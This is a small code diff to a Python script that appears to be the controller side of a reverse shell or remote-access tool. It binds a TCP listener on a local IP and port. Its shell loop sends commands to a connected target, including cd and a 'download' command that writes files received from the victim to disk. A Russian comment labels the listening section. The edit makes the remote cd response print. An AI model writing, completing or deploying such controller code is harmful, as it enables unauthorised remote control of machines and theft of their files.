@@ -28,7 +28,8 @@ def shell():
                 if command == "q":
                         break
                 elif command[:2] == "cd" and len(command) > 1:
-                        continue
+                        response = reliable_recv()
+                        print(response)
                 elif command[:8] == "download":
                         with open(command[9:], "wb") as file:
                                 result = reliable_recv()
@@ -50,9 +51,7 @@ def shell():
                         print(result)
 #подключение и прослушивание
 def server():
-        global s
-        global ip
-        global target
+        global s, ip, target
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind(("192.168.178.67",54321))
